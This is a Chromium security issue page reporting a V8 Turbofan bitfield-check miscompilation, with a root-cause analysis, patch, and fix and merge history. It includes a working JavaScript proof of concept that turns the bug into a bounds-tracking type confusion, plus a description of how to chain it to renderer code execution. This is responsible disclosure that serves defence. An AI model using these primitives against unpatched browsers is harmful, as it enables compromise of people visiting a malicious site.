# v8/Turbofan: Wrong optimization of bitfield checks

| Field | Value |
|-------|-------|
| **Issue ID** | [40056730](https://issues.chromium.org/issues/40056730) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ma...@gmail.com |
| **Assignee** | ne...@chromium.org |
| **Created** | 2021-07-30 |
| **Bounty** | $21,000.00 |

## Description

---

### Report description


v8/Turbofan: Wrong optimization of bitfield checks


---

### Bug location


#### Which product or website have you found a vulnerability in?

Google Chrome


---

### The problem


#### Please describe the technical details of the vulnerability

Tested on:
==========

 - Chromium 92.0.4515.107 Arch Linux (other platforms affected too)
 - v8/d8 on current main branch on Linux
 
Test case:
==========

Execute the following snippet in Chrome's Javascript console or d8:
```
function foo(a) {
    return ((a & 1) == 1) & ((a & 2) == 1);
}

console.log(foo(1));
for (var i = 0; i < 3e4; i++) foo(1);
console.log(foo(1));

```

The expected behavior is to print "0" twice; in reality "0" and "1" are printed.
This bug can be used to construct mis-typed values, and using a typer hardening bypass (that I simultaneously submitted with a different bug) to achieve arbitrary code execution.

Root Cause:
===========

v8/turbofan's MachineOperatorReducer (`src/compiler/machine-operator-reducer.cc` in v8) contains logic to detect bitfield-comparisons of the form `(x & A) == B` (and additionally `(x >> A) & 1`) and combine multiple of those checks into one.
Consider the detection logic for the former pattern (around line 1730 of `machine-operator-reducer.cc`):

```
  static base::Optional<BitfieldCheck> Detect(Node* node) {
    // There are two patterns to check for here:
    // 1. Single-bit checks: `(val >> shift) & 1`, where:
    //    - the shift may be omitted, and/or
    //    - the result may be truncated from 64 to 32
    // 2. Equality checks: `(val & mask) == expected`, where:
    //    - val may be truncated from 64 to 32 before masking (see
    //      ReduceWord32EqualForConstantRhs)
    if (node->opcode() == IrOpcode::kWord32Equal) {
      Uint32BinopMatcher eq(node);
      if (eq.left().IsWord32And()) {
        Uint32BinopMatcher mand(eq.left().node());
        if (mand.right().HasResolvedValue() && eq.right().HasResolvedValue()) {
          BitfieldCheck result{mand.left().node(), mand.right().ResolvedValue(),
                               eq.right().ResolvedValue(), false};
          if (mand.left().IsTruncateInt64ToInt32()) {
                ...
          }
          return result;
        }
      }
    } else {
        ...
    }
    return {};
  }
```

Here, checks of the form `(x & A) == B` with `A, B` constant are detected.
Note that there is no check that the check is actually satisfiable, i.e. that every set bit of A is also set in B.

At each `Word32And`-node where both inputs are detected as `BitfieldCheck`s, both checks are combined:

```
  base::Optional<BitfieldCheck> TryCombine(const BitfieldCheck& other) {
    if (source != other.source ||
        truncate_from_64_bit != other.truncate_from_64_bit)
      return {};
    uint32_t overlapping_bits = mask & other.mask;
    // It would be kind of strange to have any overlapping bits, but they can be
    // allowed as long as they don't require opposite values in the same
    // positions.
    if ((masked_value & overlapping_bits) !=
        (other.masked_value & overlapping_bits))
      return {};
    return BitfieldCheck{source, mask | other.mask,
                         masked_value | other.masked_value,
                         truncate_from_64_bit};
  }
```

Here, there is a check that the bits that are contained in both masks are actually compared to the same value; but there is no check that each individual check is satsifiable.
By or-ing together both `mask`s and `masked_value`s, the information of which "and" requires each bit to be set is lost, which can lead to the combination of an unsatisfiable check with another check to be satisfiable.
The simplest example (in the absence of other optimizations like constant folding) is `((x & 0) == 1) & ((x & 1) == 1)` - as the masks `0` and `1` don't share set bits, the `overlapping_bits`-check is passed, and the checks are combined to `(x & 1) == 1`; this is clearly not equivalent as `(x & 0) == 1` is obviously not satisfiable while `(x & 1) == 1` is.

We can even combine two unsatisfiable checks into a satisfiable one: For example, `((x & 1) == 2) & ((x & 2) == 1)` gets combined to `(x & 3) == 3`.

Fix:
====

The bug can be fixed by introducing an additional check either during the detection or during the combination of bitfield checks.
It seems reasonable to do the former and require that `BitfieldCheck`s never have bits set in the `masked_value` that aren't set in `mask`.
A suggested patch for this is attached as `machine-operator-reducer.cc.patch`.

Exploitation:
=============

The rest of this write-up will describe how exactly the bug was triggered in a way that causes a type confusion, and how this type confusion can be leveraged into arbitrary code exeuction using a new typer-hardening bypass.
A full PoC that executes a customizable shellcode (in the example, for Linux x64) is attached as `bitfield_rce.js`.
It can either be run with a current version of `d8` or embedded into a html file openened with `chrome --no-sandbox` (however the example shellcode has no observable effect when run in Chrome's renderer; there doesn't seem to be an easy portable way to pop a calc on Linux :( ).

There are some significant difficulties when trying to convert this bug into a mis-typed value, but it can be done.
The basic idea is to see the two checks as two abstract values `x` and `y` that satisfy `x == 0` and `y == 0`, but also `(x&y) == 1`, and use this to break the Typer's logic (while the checks actually have `Boolean`-typed results, here we treat them as integers - we can simply use `let x = check|0` to do the conversion, which gets optimized away by `MachineOperatorReducer` and doesn't interfere with the bug).
The greatest challenge however lies in actually "teaching" the Typer that `x` and `y` are both zero.

The easiest approach would be to write a check that is "obviously" wrong by size-information alone, like `(a & 1) == 42`.
Indeed, this gets typed to a constant `false`, as the left side has type `Range(0, 1)` while the right side has type `42`; but unfortunately, this also results in constant folding happening, which destroys the construct needed to trigger the bug.

Instead, we have to use checks that are less "obviously" wrong, i.e. where the mask is greater or equal than the right-hand side.
For example, `(a & 5) == 2` and `(a & 6) == 1` can be used, which are both (unbeknownst to the typer) unsatisfiable, but are combined into `(a & 7) == 3` which is satisfied for `a = 3`.

But now we still need a primitive to "teach" the typer that `x` and `y` are in fact `0`, not `1`.
However, we need to do so without interfering with the data-flow graph between `x&y` and its inputs `x`a and `y`, as this would destroy the triggering construct.
For example, we can't use `Math.min(0, x)` instead of `x` as this would result in an additional `Select`-node (side note: one should really be able to enclose the rest of the function in a `if (!(0<x)) {...}` and *there* use `Math.min(0, x)`, but due to details of the lowering of `Select`-nodes the two equivalent branches are never actually combined).

Let's first introduce a very useful primitive:

Typer-opaque constants
----------------------

It is useful to have values that unknown to the Typer-phase of the pipeline, but that can be fully reduced to constants during later phases like EarlyOptimization, where `MachineOperatorReducer` is first run.
This can be used to introduce uncertainty into types where needed to prevent e.g. constant folding.
This primitive can be obtained using the LoadElimination-phase: We use a local object `o` to hold a constant `c0` equal to zero; whenever we load this constant the typer can speculate that this is a number, but cannot reason about its exact value.
During LoadElimination, this is replaced by a constant `0` node, enabling further optimizations.
Note: For unknown reasons, the LoadElimination only seems to work properly when causing the function's optimization with a loop instead of the "%PrepareFunctionForOptimization"/"%OptimizeFunctionOnNextCall" intrinsics.

This primitive can also be used to introduce partially-known types: For example, `(o.c0 & 1)` can be typed to `Range(0, 1)` (and is later constant-folded into `0`).


Teaching the typer
------------------

To actually "teach" the typer about `x` and `y` being zero, a string-indexing operation can be used.
If we access e.g. `"a"[x]`, then a `CheckBounds()` node is generated that checks that `a` lies in `Range(0, 0)` (an array access doesn't work for our purposes, as the array length gets constant-folded too late in the compilation pipeline).
This seems useless at first because we can't actually use the output of the `CheckBounds`-nodes in our data flow.
However, `redundancy-elimination.cc` contains the following optimization:

```
Reduction RedundancyElimination::ReduceSpeculativeNumberOperation(Node* node) {
  DCHECK(node->opcode() == IrOpcode::kSpeculativeNumberAdd ||
         node->opcode() == IrOpcode::kSpeculativeNumberSubtract ||
         node->opcode() == IrOpcode::kSpeculativeSafeIntegerAdd ||
         node->opcode() == IrOpcode::kSpeculativeSafeIntegerSubtract ||
         node->opcode() == IrOpcode::kSpeculativeToNumber);
  DCHECK_EQ(1, node->op()->EffectInputCount());
  DCHECK_EQ(1, node->op()->EffectOutputCount());

  Node* const first = NodeProperties::GetValueInput(node, 0);
  Node* const effect = NodeProperties::GetEffectInput(node);
  EffectPathChecks const* checks = node_checks_.Get(effect);
  // If we do not know anything about the predecessor, do not propagate just yet
  // because we will have to recompute anyway once we compute the predecessor.
  if (checks == nullptr) return NoChange();

  // Check if there's a CheckBounds operation on {first}
  // in the graph already, which we might be able to
  // reuse here to improve the representation selection
  // for the {node} later on.
  if (Node* check = checks->LookupBoundsCheckFor(first)) {
    // Only use the bounds {check} if its type is better
    // than the type of the {first} node, otherwise we
    // would end up replacing NumberConstant inputs with
    // CheckBounds operations, which is kind of pointless.
    if (!NodeProperties::GetType(first).Is(NodeProperties::GetType(check))) {
      NodeProperties::ReplaceValueInput(node, check, 0);
    }
  }

  return UpdateChecks(node, checks);
}
```

To take advantage of this, we need to insert an operation like `SpeculativeNumberAdd`.
Note that the insertion of the `CheckBounds`-node into the data flow is unproblematic, as the check will eventually be lowered into a deoptimization-check that will only add control- or effect-dependencies (however, some of these operations don't disappear until after the EarlyOptimization phase; but this is no problem, as the MachineOperatorReducer is run a second time in the LateOptimization phase).

To have the addition actually be a *speculative* one, we can use a construct like `x + (o.cf ? "" : 0)`, where `o.cf` is a `false`-constant that is folded away during LoadElimination.
However, there is an additional problem: While the `CheckBounds`-node is inserted, the type of the addition itself actually never gets updated, as there is nothing to trigger a re-typing.
This can be fixed by adding a larger number like `2**30`, which will result in a `NumberOperationHint` of `kNumber` instead of `kSignedSmall`, which will make `typed-optimization.cc` change the node into a regular `NumberAdd` during the LoadElimination-phase:

```
Reduction TypedOptimization::ReduceSpeculativeNumberAdd(Node* node) {
  ... 
  
  NumberOperationHint hint = NumberOperationHintOf(node->op());
  if ((hint == NumberOperationHint::kNumber ||
       hint == NumberOperationHint::kNumberOrOddball) &&
      BothAre(lhs_type, rhs_type, Type::PlainPrimitive()) &&
      NeitherCanBe(lhs_type, rhs_type, Type::StringOrReceiver())) {
    // SpeculativeNumberAdd(x:-string, y:-string) =>
    //     NumberAdd(ToNumber(x), ToNufunction bar(a, arg_true) {
    Node* const toNum_lhs = ConvertPlainPrimitiveToNumber(lhs);
    Node* const toNum_rhs = ConvertPlainPrimitiveToNumber(rhs);
    Node* const value =
        graph()->NewNode(simplified()->NumberAdd(), toNum_lhs, toNum_rhs);
    ReplaceWithValue(node, value);
    return Replace(value);
  }
  return NoChange();
}
```

As this generates a new replacement node, the typer runs again on this node and correctly propagates the information from the CheckBounds.
We then subtract `2**30` again, resulting in a `SpeculativeNumberSubtract`-node that is again replaced by a regular `NumberSubtract`.
Once everything has been lowered to 32-bit integer operations, the addition and subtraction will be combined to an addition of `0` and then eliminated, thus they aren't interfering with triggering the wrong optimization.
To prevent constant folding during the typer, we use the "typer-opaque constants"-trick and initially add `2**30-(c0&1)` instead of `2**30`; this will result in a final type of `Range(-1, 0)` instead of `Range(0, 0)` for `x`.
To see that this is unproblematic look at the typer for `BitwiseAnd`-nodes (in `src/compiler/operation_typer.cc`:

```
Type OperationTyper::NumberBitwiseAnd(Type lhs, Type rhs) {
  
  ...
  
  double min = kMinInt;
  // And-ing any two values results in a value no larger than their maximum.
  // Even no larger than their minimum if both values are non-negative.
  double max =
      lmin >= 0 && rmin >= 0 ? std::min(lmax, rmax) : std::max(lmax, rmax);
  // And-ing with a non-negative value x causes the result to be between
  // zero and x.
  if (lmin >= 0) {
    min = 0;
    max = std::min(max, lmax);
  }
  if (rmin >= 0) {
    min = 0;
    max = std::min(max, rmax);
  }
  return Type::Range(min, max, zone());
}
```

If we do this for both `x` *and* `y`, then we have a result of `lmax = rmax = 0`, which results in `max = 0` in the above code; but as the value for `x&y` that's miscalculated is `1`, we still break range-tracking.

However, one last obstacle remains: the type propagation to the additions and subtracions only happens during the LoadElimination phase; the `BitwiseAnd` however is only given a type once during the initial Typer phase; we can't use the typed optimization again as there is no equivalent "SpeculativeNumberAnd".
So we need to somehow take the bounds information from the later LoadElimination phase and make it available already during the earlier Typer phase.

Time-traveling bounds information
---------------------------------

It seems impossible for the information that we have gained about a node during the LoadElimination phase to influence the type of that node during the earlier Typer phase.
But fortunately, we don't actually have to learn anything new *about that node*, we can instead add some additional operations that force the type we want during the initial Typer phase, and then use our additional later knowledge to optimize away those operations.

For example, consider using `Math.min(0, x)`.
The typer knows that this value is less than or equal to zero; and we would hope that the `Select` with condition `0<x` just gets optimized away later.
Unfortunately, this is not the case - the constant folder simply doesn't run after the time where we have gained the knowledge that `x <= 0` (this is probably the only time I will ever be annoyed about the constant folder *not* deleting stuff away).

But instead, consider `Math.min(2**32-1, x+(2**32-1)) - (2**32-1)`.
Here the SimplifiedLowering-phase can use the knowledge about `x <= 0` to convert the first addition into an (unchecked) `Int32Add` treating the result as an unsigned 32-bit integer, as no overflow can happen.
But the unsigned comparison `2**32-1 < c` for `c` of `uint32`-type *can* actually be optimized away to `false` by the MachineOperatorReducer:

```
    case IrOpcode::kUint32LessThan: {
      Uint32BinopMatcher m(node);
      if (m.left().Is(kMaxUInt32)) return ReplaceBool(false);  // M < x => false
```

This also results in the select being eliminated; the resulting expression `(x+(2**32-1)) - (2**32-1)` (where everything gets lowered to 32-bit operations) can eventually be reduced to just `x` by the MachineOperatorReducer (this optimization requires the fact that `x+(2**32-1)` is used nowhere else; this requirement destroys some other approaches to the problem).

Thus, none of the operations interfere with the buggy optimization being performed.
But during the Typer phase, the additional `Math.min` has an effect: The typer learns that its result can be at most `2**32-1`, and the subtraction can't be positive.

In effect, both inputs to the `BitwiseAnd`-node now have a type of `Range(..., 0)`, so the `BitwiseAnd` itself also gets a non-positive type, which is violated by the miscomputed result of `1`.
To get a constant type of `Range(0, 0)` with a value that is actually `-1`, we can first take the maximum with `-1`, then negate and right-shift by `31`.
The complete PoC for breaking Bounds tracking is:

```
function bar(a, arg_true) {
    let o = {c0: 0, cf: false};
    let x = ((a&5)==2)|0;
    let y = ((a&6)==1)|0;
    
    "a"[x];"a"[y]; // generate CheckBounds()

    x = x + (o.cf ? "" : (2**30) - (o.c0&1)) - (2**30); // type is Range(-1,0), but only after LoadElimination
    y = y + (o.cf ? "" : (2**30) - (o.c0&1)) - (2**30);
    
    x = Math.min(2**32-1, x + (2**32-1)) - (2**32-1); // type is Range(-1,0) already during Typer
    y = Math.min(2**32-1, y + (2**32-1)) - (2**32-1);
    let confused = Math.max(-1,x & y); // type is Range(..., 0), really is 1
    confused = Math.max(-1, confused); // type is Range(-1, 0), really is 1
    confused = ((0-confused)>>31); // type is Range(0, 0), really is -1
    return confused;
}

console.log(bar(3, true));
for (var i = 0; i < 3*10**4; i+=1) bar(0,true);
console.log(bar(3,true));
```

Typer hardening bypass
----------------------

I submitted a typer hardening bypass with another simultaneously reported bug (issue #1234764) that can be used to obtain arbitrary code execution for this bug as well.
The attached PoC demonstrates that code execution is achievable; for details see the other bug report.


#### Please briefly explain who can exploit the vulnerability, and what they gain when doing so

An attacker running a malicious website can get arbitrary code execution in the context of Chrome's renderer process.


---

### The cause


#### What version of Chrome have you found the security issue in?

Chromium 92.0.4515.107 Arch Linux / v8 on current main branch


#### Is the security issue related to a crash?

No


#### Choose the type of vulnerability

Remote Code Execution (RCE)


#### Please provide your credit information

Manfred Paul (@_manfp)




## Attachments

- [bitfield_testcase.js](attachments/bitfield_testcase.js) (text/plain, 145 B)
- [bitfield_rce.js](attachments/bitfield_rce.js) (text/plain, 8.7 KB)
- [machine-operator-reducer.cc.patch](attachments/machine-operator-reducer.cc.patch) (text/plain, 462 B)

## Timeline

### ma...@gmail.com (2021-07-30)

[Empty comment from Monorail migration]

### ch...@appspot.gserviceaccount.com (2021-07-30)

[Empty comment from Monorail migration]

### me...@google.com (2021-08-02)

neis: Could you PTAL?

[Monorail components: Blink>JavaScript>Compiler]

### ne...@chromium.org (2021-08-02)

Thanks for the detailed report.

### [Deleted User] (2021-08-02)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ne...@chromium.org (2021-08-03)

[Empty comment from Monorail migration]

### ne...@chromium.org (2021-08-03)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-08-03)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/574ca6b71c6160d38b5fcf4b8e133bc7f6ba2387

commit 574ca6b71c6160d38b5fcf4b8e133bc7f6ba2387
Author: Georg Neis <neis@chromium.org>
Date: Tue Aug 03 08:36:47 2021

[compiler] Fix a bug in MachineOperatorReducer's BitfieldCheck

Bug: chromium:1234770
Change-Id: I7368c4bcebc9b4ae78291e9e7bfc860328a742ae
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/3068941
Reviewed-by: Seth Brenith <seth.brenith@microsoft.com>
Commit-Queue: Georg Neis <neis@chromium.org>
Cr-Commit-Position: refs/heads/master@{#76062}

[modify] https://crrev.com/574ca6b71c6160d38b5fcf4b8e133bc7f6ba2387/src/compiler/machine-operator-reducer.cc


### ne...@chromium.org (2021-08-03)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-03)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-03)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-03)

This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M92. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M93. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-08-03)

This bug requires manual review: M93's targeted beta branch promotion date has already passed, so this requires manual review
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/main/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: benmason@(Android), govind@(iOS), geohsu@(ChromeOS), pbommana@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ne...@chromium.org (2021-08-04)

Rec https://crbug.com/chromium/1234770#c13:
1) Yes.
2) The one in https://crbug.com/chromium/1234770#c8.
3) Yes (verified with unittest in v8, not with the full exploit in Chrome).
4) Yes.
5) Security bug fix.
6) No.

### ne...@google.com (2021-08-09)

Hi, I'd like to merge this ASAP. Is there anything missing?

### va...@chromium.org (2021-08-09)

Please go ahead and merge to V8 9.2 and 9.3

### gi...@appspot.gserviceaccount.com (2021-08-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/9418a915d91fc28f7b7dded0b460c111b28fb679

commit 9418a915d91fc28f7b7dded0b460c111b28fb679
Author: Georg Neis <neis@chromium.org>
Date: Mon Aug 09 08:00:29 2021

Merged: [compiler] Fix a bug in MachineOperatorReducer's BitfieldCheck

Revision: 574ca6b71c6160d38b5fcf4b8e133bc7f6ba2387

BUG=chromium:1234770
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
R=nicohartmann@chromium.org

Change-Id: I4936cdfb3e5af0c1fab069bee76831cb9afd9c9c
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/3080565
Reviewed-by: Lutz Vahl <vahl@chromium.org>
Commit-Queue: Georg Neis <neis@chromium.org>
Cr-Commit-Position: refs/branch-heads/9.2@{#49}
Cr-Branched-From: 51238348f95a1f5e0acc321efac7942d18a687a2-refs/heads/9.2.230@{#1}
Cr-Branched-From: 587a04f02ab0487d194b55a7137dc2045e071597-refs/heads/master@{#74656}

[modify] https://crrev.com/9418a915d91fc28f7b7dded0b460c111b28fb679/src/compiler/machine-operator-reducer.cc


### gi...@appspot.gserviceaccount.com (2021-08-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/2aee50cba1472d397f994760e46ecc7022359a37

commit 2aee50cba1472d397f994760e46ecc7022359a37
Author: Georg Neis <neis@chromium.org>
Date: Mon Aug 09 07:57:12 2021

Merged: [compiler] Fix a bug in MachineOperatorReducer's BitfieldCheck

Revision: 574ca6b71c6160d38b5fcf4b8e133bc7f6ba2387

BUG=chromium:1234770
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
R=nicohartmann@chromium.org

Change-Id: I15af5a94e89b54c2a540442c3544ed459b832e0a
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/3080564
Reviewed-by: Lutz Vahl <vahl@chromium.org>
Commit-Queue: Georg Neis <neis@chromium.org>
Cr-Commit-Position: refs/branch-heads/9.3@{#21}
Cr-Branched-From: 7744dce208a555494e4a33e24fadc71ea20b3895-refs/heads/9.3.345@{#1}
Cr-Branched-From: 4b6b4cabf3b6a20cdfda72b369df49f3311c4344-refs/heads/master@{#75728}

[modify] https://crrev.com/2aee50cba1472d397f994760e46ecc7022359a37/src/compiler/machine-operator-reducer.cc


### ne...@chromium.org (2021-08-09)

[Empty comment from Monorail migration]

### am...@google.com (2021-08-11)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2021-08-11)

Congratulations, Manfred! The VRP Panel has decided to award you $21,000 for this report (V8 exploit + patch bonuses). Thanks so much for the excellent reporting of this issue! 

### ma...@gmail.com (2021-08-11)

Thanks very much for the fast fixes, the kind words about the report, and of course the reward!

### am...@google.com (2021-08-13)

[Empty comment from Monorail migration]

### am...@google.com (2021-08-16)

[Empty comment from Monorail migration]

### am...@google.com (2021-08-16)

[Empty comment from Monorail migration]

### rz...@google.com (2021-08-17)

[Empty comment from Monorail migration]

### rz...@google.com (2021-08-19)

[Empty comment from Monorail migration]

### gi...@google.com (2021-08-20)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-08-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/a88e1f06e4fb5a3ef3a7c3d4166abd12e6718371

commit a88e1f06e4fb5a3ef3a7c3d4166abd12e6718371
Author: Georg Neis <neis@chromium.org>
Date: Tue Aug 03 08:36:47 2021

[M90-LTS][compiler] Fix a bug in MachineOperatorReducer's BitfieldCheck

(cherry picked from commit 574ca6b71c6160d38b5fcf4b8e133bc7f6ba2387)

Bug: chromium:1234770
No-Try: true
No-Presubmit: true
No-Tree-Checks: true
Change-Id: I7368c4bcebc9b4ae78291e9e7bfc860328a742ae
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/3068941
Commit-Queue: Georg Neis <neis@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#76062}
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/3099687
Reviewed-by: Georg Neis <neis@chromium.org>
Reviewed-by: Artem Sumaneev <asumaneev@google.com>
Commit-Queue: Roger Felipe Zanoni da Silva <rzanoni@google.com>
Cr-Commit-Position: refs/branch-heads/9.0@{#70}
Cr-Branched-From: bd0108b4c88e0d6f2350cb79b5f363fbd02f3eb7-refs/heads/9.0.257@{#1}
Cr-Branched-From: 349bcc6a075411f1a7ce2d866c3dfeefc2efa39d-refs/heads/master@{#73001}

[modify] https://crrev.com/a88e1f06e4fb5a3ef3a7c3d4166abd12e6718371/src/compiler/machine-operator-reducer.cc


### rz...@google.com (2021-08-23)

[Empty comment from Monorail migration]

### am...@google.com (2021-08-26)

[Empty comment from Monorail migration]

### ne...@chromium.org (2021-09-21)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-09-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/db9c2e058b46594ffa101b059dad6d3d53a8aa9f

commit db9c2e058b46594ffa101b059dad6d3d53a8aa9f
Author: Georg Neis <neis@chromium.org>
Date: Tue Sep 21 08:43:44 2021

[compiler] Add some regression tests

Bug: chromium:1228407, chromium:1234764, chromium:1234770, chromium:1247763
Change-Id: I1e8ffaa04eeda22b71ece2f59038e5c92861fde0
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/3172751
Commit-Queue: Georg Neis <neis@chromium.org>
Commit-Queue: Maya Lekova <mslekova@chromium.org>
Auto-Submit: Georg Neis <neis@chromium.org>
Reviewed-by: Maya Lekova <mslekova@chromium.org>
Cr-Commit-Position: refs/heads/main@{#76955}

[add] https://crrev.com/db9c2e058b46594ffa101b059dad6d3d53a8aa9f/test/mjsunit/compiler/regress-crbug-1234764.js
[add] https://crrev.com/db9c2e058b46594ffa101b059dad6d3d53a8aa9f/test/mjsunit/compiler/regress-crbug-1247763.js
[add] https://crrev.com/db9c2e058b46594ffa101b059dad6d3d53a8aa9f/test/mjsunit/compiler/regress-crbug-1234770.js
[add] https://crrev.com/db9c2e058b46594ffa101b059dad6d3d53a8aa9f/test/mjsunit/compiler/regress-crbug-1228407.js


### ne...@chromium.org (2021-09-21)

[Empty comment from Monorail migration]

### [Deleted User] (2021-11-09)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1234770?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40056730)*
